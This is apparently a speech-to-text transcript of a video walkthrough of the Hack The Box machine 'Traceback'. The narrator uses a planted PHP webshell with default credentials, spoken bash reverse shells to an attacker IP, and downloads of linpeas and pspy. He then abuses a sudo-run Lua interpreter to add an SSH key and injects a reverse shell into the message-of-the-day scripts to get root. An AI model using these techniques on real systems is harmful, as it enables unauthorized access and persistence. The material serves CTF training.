 what's going on youtube this is ipsec and we've been traced back from hack the box which was marked as an easy machine so i didn't do any prep work to solve the machine prior to it that being said these intros are done after i've been on the box so i know the theme of this box is it's been hacked and people have like hired you to do some type of instant response to figure out exactly what the hacker did so you're tracing back all of his steps all in all i think it was a really fun box so let's just jump in as always we're going to start off with the nmap so i'm going to make the directory then run sudo and map dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it trace pack and then the ip address which is 10 10 10 181 i'm going to start this off and then we're just going to poke to see if it has a website or something because nmap can take a little while to run so going to 10 10 10 181 we get a message that says this site has been owned i left a backdoor for all the net free internets xh4h so looking at the source code we see just a comment that has some of the best web shells you might need so at this point i want to look for some type of shell left behind because that's what the page says so i'm going to go into the opt set list and i'm pretty sure there's like a post compromise thing in here a word list uh nmap results came back we have ssh open it's a ubuntu box we also just have http open and the http title is help us oh yeah we saw that right there so i think it's under discovery and then web content uh let's see ls-la grab shell uh let's see php see find dora grab dash i don't know what i'm trying to do i'm trying to find a compromise webshell list find dot grab dash eye shell common ah it's under back backdoors so we have asp.jsp php and perl so the first thing i want to do is see if we can guess what type of web server this is so i'm going to try index.html we get a page i'm going to try index.php we don't get a page we could try like other extensions like pl or something but i'm going to first try the php because it's not a windows box so it's not asp jsp would be if i saw like tomcat but i'm pretty sure the nmap banner showed um apache so let's do this one uh we can go back to a directory and let's just create a new pane and then we'll do go buster dir w for word list opt sec list paste that let's get rid of this thing i think that was under discovery web content and then let's see dash u for url http 101010 181 and then we'll do i think dash w for out file um backdoors.txt maybe dash o for out there we go so it is running and we do get a hit of mavic.php so let's try going to this to see exactly what we see 10 10 10 181 smebic and we get a smavic python web shell version 3. so i'm just going to google this real quick uh smavic web shell crib shell probably this download the source that's going to a bad spot um we could probably find the web shell on github but let's try admin password admin smavic admin admin and we get in so common password a lot of web shelves have bad passwords and uh now they think about it uh let's see let's do new private window 10 10 10 181 i think this is a tagline of a github repo now that i think about it yeah some of the best web shelves right here so we could have grabbed this grab this word list and brute force with this and smavic is here and we can see admin admin so now that we're on this what can we do um this is an ugly page so we've got a bunch of features like bypasser string tools uh code injector but i'm just gonna go to the console and execute a command so let's do a bash reverse shell so bash dash c bash dash i direct it to dev tcp 10 10 14 i am three point nine thousand one zero at and one like that and let's start a netcat session so um i'm just going to run script log.txt and i'm going to try logging what everything i do i'm not exactly sure if this is going to work when i do my tty check but hey that's what these videos are for so pseudo nc lvnp 9001 actually didn't need the pseudo because this port is below 1024 but just have it click run and we get a shell so let's go and update our shell so python dash c import pty pty dot spawn bin dash uh python3 okay oh god python3 dash c i'm just going to copy this copy paste then ctrl z to background stty raw minus echo if i can type then hit fg enter twice and we get a shell now we have things like tab auto complete control c and things like that um actually export term equals x term and now i can clear the screen so let's see um we are the web admin user i'm just gonna do a fine dot to see if there's any hidden files doesn't look like that so let's go home web admin and we get a note.text so we got this sysadmin i have left a tool to practice lua i'm sure you know where to find it contact me if you have any questions so we have to find something that does lua and this is like the scripting engine of nmap it's not built for end map it's just i guess i don't know exactly the history of lua i just know nmap uses it lightweight high level multi-platform paradigm programming language so there's a script we probably have to find it so let's do lsla uh the first thing i'm going to do is look for files owned by sysadmin so i'm going to do find slash dash user sys admin to devnall and it looks like we see two files that is it we can add a dash ls as well and this will also show us like file times so i don't see anything too interesting there so the next thing i'm going to do is instead of dash user i'm going to use uh newer mt and hit enter real quick because i want the date so we want this newer than probably 2020 march january february march 03 uh let's do four days before 12 and we do an exclamation point which is a not so not oh god uh newer mt 20203 20. uh crap uh is it stdy dash a s t t dash a so we have to set the rows and columns so i think it's stdy rows 16 columns 136. did that set it sweet so if you noticed before when i typed too long it kind of did this weird word wrapping thing so this command just set it my tty to expect that um we may want to change rows to probably 32 because i divided in half so let's exit because i wonder what would happen if we just keep going does it wrap up eventually nope it looks like we're fine so let's see we want to run that find command again and the issue was we didn't put a space so now this is all the files between those two dates so i guess we can just go up uh we have entries in log let's see i'm says admin i don't see any for um we can just grab dash i alway nothing so let's run lender noob so i'm going to make dirt dub dub dub uh cp up was it privilege oh what is it cd cd slash opt sometimes talking and typing is hard privilege escalation awesome sweet and then lin pease and that's probably lynn psh yep so i'm going to copy win psh to uh hdb trace back www and let's go back to that directory python 3 http server curl 10 10 14 3 port 8 000 win ps dot sh pipe it over to bash curl not found huh w get dash o for out file dev aces hm when ps.sh and there's probably a way to have w get um output to standard out so we can execute it i just don't know that i've got my head so that's why whenever i use w get i switch to this uh what maybe dash o is not out file then psh bashlin psh.1 there we go now it's running so let this go and a second i'll probably break to go up we can just do that now uh len ps.sh search up and let's start going down pseudo version environment devices software processes cron jobs everything's looking standard i'm mainly glancing over this looking for anything red and i'm not saying much let's see readable can write log files inside last directory backup files doesn't find anything nothing too interesting so far oh we have we can actually write or have pseudo pseudo-dash l without password and web admin can run a script so let's go look at that uh pseudo dash l i don't know why i didn't try this first uh sudo dash u sys admin and then we can execute this and i bet we put lua there uh test.lua so we can put a lua script or we can just um x-view code so what i'm going to do is put a lua script to write an ssh key so lua write file and this should be good so let's see file open input file read close this is going to be append right okay so this is what we want so file open this we can just do it in this window actually the uh please subscribe lua and i'm going to do slash home sys admin dot ssh authorized keys and this a should mean append so we're not deleting anything and then the next thing we need is to set the output file okay and now we need to write an ssh key so s h key gen dash f uh we'll call this cis admin and now we got sysadmin.pub so i'm going to cat sysadmin.pub copy the key this last piece of keys is just like for identification purposes so later you know whose it is you don't actually need it so write the key then we probably gotta close the file okay the only issue i have is i don't know if that dot ssh directory exists under sysadmin so if this fails i'll probably try to look up how to write directories and do like a ch mod chmod authorized keys to probably 600 but let's try this uh stand up the server again go back to wget and we'll get please subscribe.lua that was a 200. okay so let's go to this and dev shm please subscribe to lua and we'll delete test and we don't get any error messages so before we got an error message saying it couldn't find the file but this time it just seems to have exited cleanly so i'm going to go back here chmod 600 on sysadmin which is going to be the private key ssh keygen created sh-i says admin the username sysadmin at 10 10 10 181 accept this key and we get in so we have a message saying owned by x h4h and i'm going to type bash to get my normal prompt i just like seeing that so lsla let's see august 14th there's a user.txt and august 24th we have love it we don't really see any um thing too interesting actually there is a bash history uh what is today's date is today the 25th today is the 14th oh that's 2019. what's in bash history do we miss a bash history before if we went to cd home web admin we probably can't read this file let's go back to this shell cat dot bash history huh we did miss a file uh studio l and then we got this and him deleting the file so if you looked at the history it's kind of a hint that you create a file and then run it and then delete so we're kind of tracing the hacker's steps which i'm guessing that's why this box is called traceback because there's someone on the system and you gotta trace them back to find out exactly what they did so let's do lsla and let's go with the theme of the box and kind of do instant response so again i'm going to do the good old find command find slash dash user says admin let's actually go back to our home directory make sure i didn't miss anything is it love it history help exit that's me typing it um okay so fine slash dash user um sysadmin to devnl right yeah uh we probably want to dash out ls i always like saying dash ls so i know i did the command correctly so there's a lot of stuff in proc and run which we don't need so we can grab dash v and then i'm going to do proc and then backslash pipe which is going to be an or statement in this and slash run and we could do spaces first so then we'll only grab like space and then that we probably don't want cis so again backslash pipe slash assist to get rid of that and we only have a few files so everything's in the sysadmin directory let's see uh we can check like find slash var log dash readable to see what logs we can read uh there's quite a few so apt history i'm mainly looking to see like a web server log if we can get the web server log then maybe we can find sensitive information there commonly it will store like if you have username password over a get request sometimes you'll see people typing in a password over the username field so i don't really see that i don't see like an ssh thing um these general files are i don't know exactly how to read them nothing too interesting in logs so let's see we can do again the time so find dash newer mt and let's do um i'm actually going to go up while these previous graphs are i'll do newer mt 2019 probably it's weird i'm stuck between doing 2020 where user.txt is created and 2019. um i'm going with this is some type of hack the box flag rotation thing because if this file is indeed created in august 2020 and i'm doing this video also in august 2020 the chances are that wasn't left there by the creator so i'm going to go with the 24 2019 thing because that is today uh there's a love it history from day so today is apparently august 14th i didn't know that with the quarantine going on i've kind of like forgotten all sense of what day it is but let's do this 2019 august i think month eight and 22. let's do two days before and we'll do dash newer mt 2019 08 26 two days after and we got rid of all our grips but thankfully they are right here to do dev null greps and we need slash davnol there we go oh god there's a lot of things um i don't know why espen is here lsla oh that's august 23rd let's just do august 24th maybe this is when the box was built that all these are created with that timestamp so let's see well something sticks out right away var backups dot update motd 50 motda news bunch of update things for lib lots of stuff invar lib user share so i think we got lucky there because i would have kept filtering out this to try to get information i wanted but this looks like it's going to be something unique server backups dot update motd uh cat header let's see can we view the cron let's do that find command grab dash i cron let's see this is a directory can we list files in there no we can't uh let's see ls permission guide root done so what i was hoping was like the error message would give me something different between reading a file that doesn't exist and one that would uh let's do lsla on this directory i was hoping maybe there's something that indicates there's files in it i don't think there is so let's see twice yeah i don't think there's a way to know there's files inside of this um maker temp maker slash dev shm temp stat net yeah so there's nothing in this directory and links is too i was thinking maybe the link shows how many files are linked in it but nope i'm out of luck there so my best guess right now is let's run a program called ps spy process spy github and see if there's anything being executed so go here let's download the 64-bit small version save it and then uh let's do the other split cdw mv downloads piece by 64 s to here python-m http server we got a pseudo that i think oh python3 maybe yeah that was it so let's go dev shm that's on the web admin user let's go to sysadmin w get 10 10 14 3 port 8 000 and then pspy i think it's 2s's nope ps py64s chmod plus x i'm going to hit alt period to do the argument of my last thing and then just get rid of that typo chmod execute it and we'll see if any files get created and i guess while it does that i'm going to do ssh dash i sysadmin uh we have to go upper directory sh-i sysadmin says admin at 10 10 10 181 so we can look at all the files that get executed want to ssh in let's see run parts doing i guess the message of the day stuff doesn't know what this file is and it looks like the cron also may have kicked off as we see been cp all these files over this so what i'm going to do is make sure that's the cron looks like it is because it's got a sleep 30 and then doing it again but i'm going to make sure my ssh into the box did not start that yeah so my sh again did not start all that that was just the crown that coincided when i was doing the ssh finally enough so these message of the day scripts get written whenever someone logs in so what we can do is edit one of these and then because it's copying them over top of this when the cron goes off again then we shn and we get code execution most likely so let's go and just edit this file i wonder if we'll have vi with us oh wait i was in um edit mode i think exit i was in edit mode so things weren't going off and i think my login coincided again with this cron let's see if that cp happens it does not but you can see all the files that happen when you log in so vi on this file and what we want to do is just execute code so we can say read only file cannot open for writing cd word backups dot update see it doesn't look like we can rate any of these who owns this folder root root admin we do not know it huh i'm actually not sure at this point let's go back to running find commands i'm gonna do ctrl r and type find and let's see newer empty yeah let's do dash writable and we don't have any results let's see let's do that oh well grabbing for con as i say we should get at least some hits because there's stuff in our home directory but if we're grepping for crown that explain does not explain it um okay oh i have an e here uh i haven't shot myself in the foot there and went down a long rabbit hole so this two dev knoll thing remember i'm hiding standard error and i hide this because i don't want to go down directories i don't have read permission to and just error out but because i was hiding error messages it hid the uh my misspelling of writable so that that explains it uh let's do write a poll like that okay only got the home directory we can we can write to oh that's linked to devnl so let's see who am i is this admin cat etsy pasta d cat etsy groups i can probably just type groups yeah it's this admin so let's do this find command and then we'll do dash user assist admin and these are all the files that sysadmin owns and you can see all the stuff we dropped to the box so doing instant response yourself is always eye-opening we can do i don't know why i got rid of sysadmin but group says admin and let's see oh we got um the ability to write and update motd so we can't do it to the backup but we can just straight up right here so i'm guessing uh the backup thing is to revert it so users don't mess up the experience for other users like thinking back and this is an instant response thing i was thinking oh that's cheeky they um put a crown in to copy their shell over top of the message of the day so they keep persistence but really the crown was there to stop people from mucking with the message of the day and let's see and oftentimes you will see like in these instant response things changes being made to like files like this that don't really seem malicious but it's just like kind of a backdoor way in it's a really sneaky persistence thing to like not drop your prives file so you can always just private skin but edit a file that's commonly used where you can just redo the exploit so if we edit this header let's do bash dash i bashed rc uh direct dev tcp 10 10 14 3 9 000 1 0 and 1 like that i've reversed these it's bash dash i here and bash dash c here files have been changed since reading it sure and let's get out of this shell actually i'm going to do my modifier key then x to kill the pain and then i put up a new pane nc lvmp 9001 shn and we get a shell back because this mess of the day file gets executed every time someone logs in so when someone logs in instead of printing out the mesh of the day with an echo we had put a bash command to execute a reverse shell and as the root user we can now just go into slash root and there's root.text so that is the box hope you guys enjoyed it and me doing the live run but there's one thing i want to look at real quick i want to see if lynn p's will show me this mistake so i'm going to do bash on len ps.sh and see if it highlights the message of the day in big red and yellow font because that is 99 of the time a priv-esque vector so letting this run um it's probably just taking a while because it's doing some type of reverse dns lookup right here so it'll probably take 30 seconds oh moved on quicker than i thought so testing a bunch of pseudo stuff come on i'm just going gonna fast forward the video until this is done so now it's done let's go and uh look at everything lin p's has found when p's sh let's do bash lin go to the very top and let's see no big red and yellow highlights yet nothing just yet come on hoping we find it scrolling down a bunch of set uid stuff capabilities we could run a packet capture it looks like sources.back there we go so interesting group writable files not in home and we get the etsy directory and if we go to this page let's see if it says exactly what we did so copy go here files so it doesn't tell you putting bashcode in that but i'm sure if you google around for like uh motd prevesque you'd see exactly what it's doing but sorry for the sloppy edit i was just putting timestamps in before i upload the video and it's an hour before the video needs to launch and i forgot i what didn't go through this log file i had created like earlier in the video before i did a reverse shell so we can take a look at it and see it does log everything that is going through that tty shell it's sending some bad characters that we may think like this um escape whatever but if we do a less dash r to actually process those then the output does look a lot better so you may want to always kind of use script before you do a reverse shell since it will definitely log what you're doing so you can go back and look at it afterwards um script also does support file names uh i think if you just put the file name it will so script please sub dot log and now it's logging to please sub instead of log.txt so we can echo thanks for the sub and then we exit this so we exit our script and then cat please sub dot log so just a little hint if you want to improve taking logs while you do boxes when you do over shells always use the script command so that would be the box i hope you guys enjoyed it take care and i'll see you all next week